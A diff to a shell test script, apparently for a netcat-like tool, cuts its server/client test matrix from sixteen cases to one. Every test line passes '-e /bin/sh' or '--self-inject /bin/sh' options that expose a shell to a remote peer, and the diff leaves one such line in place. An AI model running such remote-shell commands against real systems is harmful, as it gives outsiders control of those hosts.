@@ -193,28 +193,5 @@ run_test() {
 for curr_round in $(seq "${RUNS}"); do
 	#         server opts            client opts
 	# BIND ON ANY
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh -4 -vvvv"  "2" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh -6 -vvvv"  "3" "16" "${curr_round}" "${RUNS}"
-
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "4" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv" "${RHOST} ${RPORT} -e /bin/sh -4 -vvvv"  "5" "16" "${curr_round}" "${RUNS}"
-
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "6" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv" "${RHOST} ${RPORT} -e /bin/sh -6 -vvvv"  "7" "16" "${curr_round}" "${RUNS}"
-	# no verbosity
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}         " "${RHOST} ${RPORT} -e /bin/sh         "  "8" "16" "${curr_round}" "${RUNS}"
-
-	## BIND ON SPECIFIC
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"   "9" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv"  "10" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv"  "11" "16" "${curr_round}" "${RUNS}"
-
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -4 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"  "12" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -4 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv"  "13" "16" "${curr_round}" "${RUNS}"
-
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -6 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"  "14" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -6 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv"  "15" "16" "${curr_round}" "${RUNS}"
-	## no verbosity
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh         " "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}         "  "16" "16" "${curr_round}" "${RUNS}"
+	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "1" "${curr_round}" "${RUNS}"
 done
